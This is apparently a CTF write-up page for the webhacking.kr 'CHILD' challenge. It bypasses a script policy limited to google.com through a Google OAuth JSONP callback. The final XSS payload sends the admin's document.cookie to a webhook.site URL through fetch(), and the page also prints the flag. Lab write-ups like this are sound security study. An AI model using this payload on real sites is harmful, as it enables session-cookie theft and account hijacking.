@@ -1,0 +1,84 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>webhacking CHILD Solution | Avishai’s CTF Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="webhacking CHILD Solution" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="…" />
+<meta property="og:description" content="…" />
+<link rel="canonical" href="http://localhost:4000/webhacking.kr/CHILD.html" />
+<meta property="og:url" content="http://localhost:4000/webhacking.kr/CHILD.html" />
+<meta property="og:site_name" content="Avishai’s CTF Writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="webhacking CHILD Solution" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"webhacking CHILD Solution","url":"http://localhost:4000/webhacking.kr/CHILD.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=885199f883f5b847967c84d0262eab1578eb3466">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="/assets/css/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+  </head>
+  <body>
+      <div id="header">
+        <nav>
+          <ul>
+            <li class="fork"><a href="https://github.com/avishaigonen123/CTF_writeups">View On GitHub</a></li>
+            
+          </ul>
+        </nav>
+      </div><!-- end header -->
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Avishai's CTF Writeups</h1>
+          <p>...</p>
+          <hr>
+          <span class="credits left">Project maintained by <a href="https://github.com/avishaigonen123">avishaigonen123</a></span>
+          <span class="credits right">Hosted on GitHub Pages &mdash; Theme by <a href="https://twitter.com/mattgraham">mattgraham</a></span>
+        </div>
+
+        <h1 id="webhacking-child-solution">webhacking CHILD Solution</h1>
+
+<p>Here we can run scripts only from the subdomain of <code class="language-plaintext highlighter-rouge">*.google.com</code>.</p>
+
+<p>However, using this github repo <a href="https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt">JSONBee</a>, we can find snippets that let us run our code :)</p>
+
+<p>I am using this snippet:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"&gt;&lt;/script&gt;
+</code></pre></div></div>
+
+<p>And, as you can see:
+<img src="/webhacking.kr/images/CHILD_xss_poc.png" alt="XSS poc" /></p>
+
+<p>This will be our payload to the admin:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?inject=?inject=&lt;script%20src="https://accounts.google.com/o/oauth2/revoke?callback=fetch(%27https://webhook.site/b9845d0e-4624-4ee7-89c9-90bfd2b1d3eb/?cookies=%27%252bdocument.cookie);"&gt;&lt;/script&gt;
+</code></pre></div></div>
+<p>notice to base encode <code class="language-plaintext highlighter-rouge">+</code> twice.</p>
+
+<p><img src="/webhacking.kr/images/CHILD.png" alt="win picutre" /></p>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">FLAG{I_hacked_google.com_and_it_was_ezpz}</code></em></strong></p>
+
+
+      </section>
+
+    </div>
+  </body>
+</html>
